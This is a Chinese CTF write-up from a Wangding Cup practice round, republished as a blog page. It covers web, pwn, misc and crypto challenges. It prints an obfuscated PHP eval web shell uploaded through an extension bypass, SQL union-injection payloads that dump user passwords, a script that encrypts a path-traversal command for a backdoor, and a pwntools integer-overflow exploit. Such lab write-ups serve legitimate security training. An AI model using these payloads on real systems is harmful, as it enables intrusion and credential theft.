@@ -1,0 +1,299 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【相关分享】网鼎杯拟赛 Writeup | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="网鼎杯拟赛 Writeup，签到题 + Web 文件上传改后缀 bypass。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【相关分享】网鼎杯拟赛 Writeup">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/%E7%9B%B8%E5%85%B3%E5%88%86%E4%BA%AB-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%8B%9F%E8%B5%9BWriteup/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="网鼎杯拟赛 Writeup，签到题 + Web 文件上传改后缀 bypass。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="拟赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Web/%E7%9B%B8%E5%85%B3%E5%88%86%E4%BA%AB-%E7%BD%91%E9%BC%8E%E6%9D%AF%E6%8B%9F%E8%B5%9BWriteup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【相关分享】网鼎杯拟赛 Writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【相关分享】网鼎杯拟赛 Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【相关分享】网鼎杯拟赛 Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/211855.html">https://www.ctfiot.com/211855.html</a><br>ID: 211855</p>
+</blockquote>
+<p>免责声明</p>
+<p>❝</p>
+<p>由于传播、利用本公众号“隼目安全”所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,公众号“隼目安全“及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉谢谢！</p>
+<p>签到题</p>
+<p>直接看群公告</p>
+<p>web1</p>
+<p>访问&#x2F;upload.php</p>
+<p>将php一句话改后缀.png然后上传，burp抓包后修改为php</p>
+<p>数据包:</p>
+<p>POST &#x2F;upload.php HTTP&#x2F;1.1<br>Host: 0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:<br>43000<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:<br>131.0) Gecko&#x2F;20100101 Firefox&#x2F;131.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;png,image&#x2F;svg+xml,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—————————234681467240373262723660237873<br>Content-Length: 514<br>Origin: <a target="_blank" rel="noopener" href="http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com/">http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com</a>:<br>43000<br>Connection: close<br>Referer: <a target="_blank" rel="noopener" href="http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com/">http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com</a>:<br>43000&#x2F;upload.php<br>Upgrade-Insecure-Requests: 1<br>Priority: u&#x3D;0, i</p>
+<p>—————————–234681467240373262723660237873<br>Content-Disposition: form-data; name&#x3D;”fileToUpload”; filename&#x3D;”Phantom.php”<br>Content-Type: image&#x2F;png</p>
+<?php class G7LRDcp8 { public function __construct($H2G8N){ @eval("/*Z#£¤h*u@!h3Myrz9616*/".$H2G8N."/*Z#£¤h*u@!h3Myrz9616*/"); }}new G7LRDcp8($_REQUEST['Phantom']);?>
+<p>—————————–234681467240373262723660237873<br>Content-Disposition: form-data; name&#x3D;”submit”</p>
+<p>ä¸ä¼ <br>—————————–234681467240373262723660237873—</p>
+<p>Antsword连接读取根目录flag.txt</p>
+<p>web2</p>
+<p>Mozhe原题</p>
+<p>注入语句为id&#x3D;1 order by 1 数字1逐次提升发现是5报错。说明字段数为4</p>
+<p>注入语句为id&#x3D;-1 union select 1,2,3,4 回显2和3，说明可在这两处执行sql语句</p>
+<p>接下来就是爆库名，表名，列名，字段</p>
+<p>最后payload</p>
+<p>GET ?id&#x3D;-1%20union%20select%201,group_concat(OAname),group_concat(PassWord),4%20from%20OA_UsersCmd5解密后</p>
+<p>登录即可获取flag</p>
+<p>web3</p>
+<p>首先用Dirsearch来扫目录</p>
+<p>找到&#x2F;wwwroot.zip</p>
+<p>看了几乎一个多小时，最后把目光锁定在describedssTest.php文件中</p>
+<p>解密一手</p>
+<p>看到需要传入id，花10块钱解密后发现是20241026的两次md5</p>
+<p>这里id参数传入20241026的一次md5 这里看到post传入d参数，这里会用d函数解密</p>
+<p>describedssTest.php了解到d函数逻辑后写一个加密脚本</p>
+<?php error_reporting(0);
+header('Content-type: text/html; charset=utf-8');
+$p8 = '3b7430adaed18facca7b799229138b7b';
+$a8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=';
+$d8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09';
+$v8 = '0329647546905494';
+function e($D, $K)
+{
+    $cipher = 'aes-128-cbc';
+    $encrypted = openssl_encrypt($D, $cipher, $K, 0, $GLOBALS['v8']);
+    $result = base64_encode($GLOBALS['v8'] . $encrypted);
+    $result = base64_encode($result);
+    return $result;
+}
+function d($D, $K)
+{
+    $cipher = 'aes-128-cbc';
+    $decodedData = base64_decode(base64_decode($D));
+    $encryptedData = substr($decodedData, openssl_cipher_iv_length($cipher));
+    $decrypted = openssl_decrypt($encryptedData, $cipher, $K, 0, $GLOBALS['v8']);
+    return $decrypted;
+}
+
+echo e("cat ../../../../../../../../flag.txt", $p8);
+?>
+
+<p>将运行结果通过d参数post传入</p>
+<p>将结果解密</p>
+<?php error_reporting(0);
+header('Content-type: text/html; charset=utf-8');
+$p8 = '3b7430adaed18facca7b799229138b7b';
+$a8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=';
+$d8 = 'TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09';
+$v8 = '0329647546905494';
+function e($D, $K)
+{
+    $cipher = 'aes-128-cbc';
+    $encrypted = openssl_encrypt($D, $cipher, $K, 0, $GLOBALS['v8']);
+    $result = base64_encode($GLOBALS['v8'] . $encrypted);
+    $result = base64_encode($result);
+    return $result;
+}
+function d($D, $K)
+{
+    $cipher = 'aes-128-cbc';
+    $decodedData = base64_decode(base64_decode($D));
+    $encryptedData = substr($decodedData, openssl_cipher_iv_length($cipher));
+    $decrypted = openssl_decrypt($encryptedData, $cipher, $K, 0, $GLOBALS['v8']);
+    return $decrypted;
+}
+
+echo d("TURNeU9UWTBOelUwTmprd05UUTVORmhoU2xadVkydEVhWFFyVTJoYVVqTXZWSE5CUTBOWlRtOWtha3RqVUc5dVFUVnpZMHB0ZUhsTmVISnZaaTlYU25sYWQwUm9XVEJHY1dWeVNHVlhXR0k9
+", $p8);
+?>
+
+<p>wdflag{kxfvkehm1111hn02mm5m35bu6dv5gzy8}</p>
+<p>REVERSE01</p>
+<p>没什么好说的，java附件直接丢GPT一把梭</p>
+<p>flag{2024_____W_D_B!}</p>
+<p>PWN01</p>
+<p>先打开附件</p>
+<p>先看看逻辑</p>
+<p>首先用户输入一个数字，保存在buffer数组中，并将其转换为整数val</p>
+<p>val 必须是非负数，否则报错并退出 如果 val 合法，程序计算doubled &#x3D; 2 * val并打印它</p>
+<p>doubled等于-100时，输出flag</p>
+<p>在这里可以利用2147483647整数溢出</p>
+<p>Exp</p>
+<p>from pwn import *<br>host &#x3D; “0192c6987f867c18b31f18e2c806640a.dl7n.dg04.wangdingcup.com”<br>port &#x3D; 43007<br>conn &#x3D; remote(host, port)<br>conn.recvuntil(b”Input: “)<br>payload &#x3D; str(2147483647 + 1)<br>conn.sendline(payload.encode())<br>response &#x3D; conn.recvall().decode()<br>print(response)<br>conn.close()</p>
+<p>wdflag{ztzepfh0727r0kt5kx275c2xdd6rq9h6}</p>
+<p>MISC01</p>
+<p>先丢入Neta</p>
+<p>发现GET &#x2F;home?id&#x3D;-1 UNION ALL SELECT 1,2,GROUP_CONCAT(id,’-w-d-f-l-a-g{14030b5a31e7984</p>
+<p>直接在txt中查找</p>
+<p>wdflag{14030b5a31e7984365c08da0ece8dd03}</p>
+<p>CRYPTO01</p>
+<p>密文pvkq{G!N@L#}</p>
+<p>凯撒密码解密</p>
+<p>CRYPTO02附件丢入010分析</p>
+<p>最后一段东西，不管它是什么，先丢入随波逐流</p>
+<p>wdflag{de605a3746fdc919}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:</span><br><span class="line">43000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:</span><br><span class="line">131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------234681467240373262723660237873</span><br><span class="line">Content-Length: 514</span><br><span class="line">Origin: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:</span><br><span class="line">43000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:</span><br><span class="line">43000/upload.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------234681467240373262723660237873</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;Phantom.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php class G7LRDcp8 &#123; public function __construct($H2G8N)&#123; @eval(&quot;/*Z#£¤h*u@!h3Myrz9616*/&quot;.$H2G8N.&quot;/*Z#£¤h*u@!h3Myrz9616*/&quot;); &#125;&#125;new G7LRDcp8($_REQUEST[&#x27;Phantom&#x27;]);?&gt;</span><br><span class="line">-----------------------------234681467240373262723660237873</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------234681467240373262723660237873—</span><br><span class="line">&lt;?php error_reporting(0);</span><br><span class="line">header(&#x27;Content-type: text/html; charset=utf-8&#x27;);</span><br><span class="line">$p8 = &#x27;3b7430adaed18facca7b799229138b7b&#x27;;</span><br><span class="line">$a8 = &#x27;TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=&#x27;;</span><br><span class="line">$d8 = &#x27;TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09&#x27;;</span><br><span class="line">$v8 = &#x27;0329647546905494&#x27;;</span><br><span class="line">function e($D, $K)</span><br><span class="line">&#123;</span><br><span class="line">    $cipher = &#x27;aes-128-cbc&#x27;;</span><br><span class="line">    $encrypted = openssl_encrypt($D, $cipher, $K, 0, $GLOBALS[&#x27;v8&#x27;]);</span><br><span class="line">    $result = base64_encode($GLOBALS[&#x27;v8&#x27;] . $encrypted);</span><br><span class="line">    $result = base64_encode($result);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">function d($D, $K)</span><br><span class="line">&#123;</span><br><span class="line">    $cipher = &#x27;aes-128-cbc&#x27;;</span><br><span class="line">    $decodedData = base64_decode(base64_decode($D));</span><br><span class="line">    $encryptedData = substr($decodedData, openssl_cipher_iv_length($cipher));</span><br><span class="line">    $decrypted = openssl_decrypt($encryptedData, $cipher, $K, 0, $GLOBALS[&#x27;v8&#x27;]);</span><br><span class="line">    return $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo e(&quot;cat ../../../../../../../../flag.txt&quot;, $p8);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php error_reporting(0);</span><br><span class="line">header(&#x27;Content-type: text/html; charset=utf-8&#x27;);</span><br><span class="line">$p8 = &#x27;3b7430adaed18facca7b799229138b7b&#x27;;</span><br><span class="line">$a8 = &#x27;TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=&#x27;;</span><br><span class="line">$d8 = &#x27;TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09&#x27;;</span><br><span class="line">$v8 = &#x27;0329647546905494&#x27;;</span><br><span class="line">function e($D, $K)</span><br><span class="line">&#123;</span><br><span class="line">    $cipher = &#x27;aes-128-cbc&#x27;;</span><br><span class="line">    $encrypted = openssl_encrypt($D, $cipher, $K, 0, $GLOBALS[&#x27;v8&#x27;]);</span><br><span class="line">    $result = base64_encode($GLOBALS[&#x27;v8&#x27;] . $encrypted);</span><br><span class="line">    $result = base64_encode($result);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">function d($D, $K)</span><br><span class="line">&#123;</span><br><span class="line">    $cipher = &#x27;aes-128-cbc&#x27;;</span><br><span class="line">    $decodedData = base64_decode(base64_decode($D));</span><br><span class="line">    $encryptedData = substr($decodedData, openssl_cipher_iv_length($cipher));</span><br><span class="line">    $decrypted = openssl_decrypt($encryptedData, $cipher, $K, 0, $GLOBALS[&#x27;v8&#x27;]);</span><br><span class="line">    return $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo d(&quot;TURNeU9UWTBOelUwTmprd05UUTVORmhoU2xadVkydEVhWFFyVTJoYVVqTXZWSE5CUTBOWlRtOWtha3RqVUc5dVFUVnpZMHB0ZUhsTmVISnZaaTlYU25sYWQwUm9XVEJHY1dWeVNHVlhXR0k9</span><br><span class="line">&quot;, $p8);</span><br><span class="line">?&gt;</span><br><span class="line">from pwn import *</span><br><span class="line">host = &quot;0192c6987f867c18b31f18e2c806640a.dl7n.dg04.wangdingcup.com&quot;</span><br><span class="line">port = 43007</span><br><span class="line">conn = remote(host, port)</span><br><span class="line">conn.recvuntil(b&quot;Input: &quot;)</span><br><span class="line">payload = str(2147483647 + 1)</span><br><span class="line">conn.sendline(payload.encode())</span><br><span class="line">response = conn.recvall().decode()</span><br><span class="line">print(response)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
